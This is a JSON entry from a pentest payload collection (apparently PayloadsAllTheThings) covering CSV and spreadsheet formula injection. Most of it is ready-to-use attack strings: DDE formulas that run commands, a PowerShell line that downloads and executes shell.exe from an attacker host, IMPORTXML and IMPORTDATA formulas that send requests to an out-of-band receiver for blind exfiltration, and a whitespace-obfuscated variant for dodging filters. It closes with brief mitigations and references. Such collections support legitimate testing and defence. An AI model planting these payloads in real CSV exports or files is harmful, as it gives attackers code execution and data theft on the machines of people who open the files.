@@ -1,0 +1,132 @@
+{
+  "id": "payload_000012",
+  "important": {
+    "title": "CSV Injection / Formula Injection",
+    "category": "Injection",
+    "sub_category": "CSV / Formula Injection",
+    "tags": ["csv","formula-injection","dde","excel","google-sheets","exfiltration"],
+    "targets": {
+      "os": ["Any"],
+      "system": ["Spreadsheet Clients","CSV Exports","Web App CSV Endpoints"]
+    },
+    "risk": "critical"
+  },
+  "variants": [
+    {
+      "match": { "os": ["Any"], "system": ["Spreadsheet Client (Excel/LibreOffice)"] },
+      "payload": {
+        "explanation": "DDE / Formula payload executed when opening a CSV in vulnerable spreadsheet clients (spawn calc or run commands).",
+        "code": "=CMD|' /C calc'!A0\n=cmd|' /C powershell IEX(wget http://ATTACKER/shell.exe)'!A0\n@SUM(1+1)*cmd|' /C calc'!A0",
+        "run_context": "Open the CSV file in Excel/LibreOffice (client-side); requires client that executes DDE/formulas.",
+        "placeholders": {
+          "ATTACKER": "attacker-controlled host serving payload/executable",
+          "COMMAND": "cmd /C calc or powershell command"
+        },
+        "notes": "Many modern spreadsheet apps warn about external data or block DDE; behavior depends on client/version and user interaction."
+      }
+    },
+    {
+      "match": { "os": ["Any"], "system": ["Spreadsheet Client (Formula)"] },
+      "payload": {
+        "explanation": "Prefixing cells with =,+,-,@ to force formula evaluation and chain commands or obfuscate payload.",
+        "code": "=AAAA+BBBB-CCCC&\"Hello\"/12345&cmd|'/c calc.exe'!A\n=         cmd|'/c calc.exe'!A",
+        "run_context": "CSV cell content that begins with formula characters evaluated by spreadsheet on open.",
+        "placeholders": {
+          "CALC_CMD": "calc.exe or other local command",
+          "OBFUSCATION": "use spaces/nulls to evade simple filters"
+        },
+        "notes": "Use of nulls/whitespace can bypass naive blacklist filters; modern clients may strip/alert."
+      }
+    },
+    {
+      "match": { "os": ["Any"], "system": ["Google Sheets / Online Sheets"] },
+      "payload": {
+        "explanation": "Use Google Sheets IMPORT* functions to cause the sheet to fetch external resources (exfiltration / blind data leak).",
+        "code": "=IMPORTXML(\"http://BURP-COLLABORATOR/csv\",\"//a/@href\")\n=IMPORTDATA(\"http://BURP-COLLABORATOR/csv\")\n=IMPORTHTML(\"http://BURP-COLLABORATOR/data\",\"table\",1)",
+        "run_context": "Paste the formula into a Google Sheet cell or include as CSV cell text; Google will prompt before external fetch.",
+        "placeholders": {
+          "BURP-COLLABORATOR": "attacker.cooperating-collab-domain or your OOB receiver",
+          "IMPORTURL": "URL to exfiltration endpoint"
+        },
+        "notes": "Google Sheets warns before external fetch; import functions can still be used for blind exfil if user accepts."
+      }
+    },
+    {
+      "match": { "os": ["Any"], "system": ["CSV Export Flow"] },
+      "payload": {
+        "explanation": "Prefix untrusted CSV fields with a formula-starting char to force execution when opened in spreadsheet software.",
+        "code": "=cmd|' /C calc'!A0",
+        "run_context": "Server-side: ensure CSV escaping/sanitization before returning file to user; client-side: opening CSV triggers evaluation.",
+        "placeholders": {
+          "FIELD": "user-controlled CSV field/value"
+        },
+        "notes": "Sanitize at server to prefix dangerous chars with an apostrophe (') or escape; do not rely on client warnings."
+      }
+    }
+  ],
+  "usage": {
+    "steps": [
+      "Identify CSV export endpoints or fields that contain user-controlled content.",
+      "Insert payload into a CSV cell using a formula-starting character (=,+,-,@).",
+      "Deliver CSV to target or test locally by opening in various spreadsheet clients (Excel, LibreOffice, Google Sheets).",
+      "For DDE/command payloads, observe client behavior (warnings, blocked execution).",
+      "For Google Sheets imports, host a detectable OOB endpoint (Burp Collaborator) and insert IMPORT* formula to detect fetch."
+    ],
+    "tools": [
+      "Burp Suite (collaborator / proxy) - detect external fetches",
+      "Local web server (python -m http.server) - host payload/executable",
+      "Excel / LibreOffice / Google Sheets - test clients"
+    ],
+    "required_params": {
+      "target_csv_endpoint": { "required": false, "example": "https://app.example.com/export/users.csv" },
+      "oob_listener": { "required": false, "example": "https://oob.example.net/capture" }
+    },
+    "code_samples": [
+      {
+        "title": "DDE Spawn calc (Excel)",
+        "description": "Classic DDE payload to spawn calc.exe (Windows).",
+        "code": "=cmd|' /C calc'!A0",
+        "placeholders": { "COMMAND": "calc.exe" },
+        "run_context": "Open CSV in vulnerable Excel (Windows)"
+      },
+      {
+        "title": "PowerShell download & execute (obvious dangerous example)",
+        "description": "Direct PowerShell download+exec (may be blocked by defenders).",
+        "code": "=cmd|' /C powershell IEX(wget http://ATTACKER/shell.exe)'!A0",
+        "placeholders": { "ATTACKER": "attacker-server" },
+        "run_context": "Open CSV in vulnerable client that allows DDE/payload execution"
+      },
+      {
+        "title": "Google Sheets IMPORTXML exfiltration (OOB)",
+        "description": "Blind exfil using Google Sheets' IMPORTXML to fetch an attacker URL.",
+        "code": "=IMPORTXML(\"http://BURP-COLLABORATOR/csv\",\"//a/@href\")",
+        "placeholders": { "BURP-COLLABORATOR": "oob-listener.example.net" },
+        "run_context": "Paste into Google Sheet or include as CSV cell"
+      },
+      {
+        "title": "UTF-Null Obfuscation Example",
+        "description": "Use nulls/spaces to obfuscate 'cmd' strings and bypass naive filters.",
+        "code": "=    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A",
+        "placeholders": { "OBFUSCATION": "nulls/whitespace in payload" },
+        "run_context": "Open CSV in spreadsheet client"
+      }
+    ],
+    "mitigations": [
+      "Sanitize CSV output: prefix cells that start with =,+,-,@ with a single quote (') or a safe marker.",
+      "Provide CSV downloads with explicit warning and use .txt extension for untrusted content.",
+      "Escape/encode user-supplied fields so they are treated as literal strings, not formulas.",
+      "Disable DDE support and block execution of external formulas where possible in enterprise settings.",
+      "Use content-disposition filename and content-type headers properly and educate users about opening CSVs."
+    ],
+    "references": [
+      "CSV Injection – A Guide To Protecting CSV Files - Akansha Kesharwani",
+      "CSV Excel Macro Injection - Timo Goosen, Albinowax",
+      "From CSV to Meterpreter - Adam Chester",
+      "The Absurdly Underestimated Dangers of CSV Injection - George Mauer"
+    ]
+  },
+  "system": {
+    "version": "2.0.0",
+    "source": "PayloadsAllTheThings"
+  }
+}
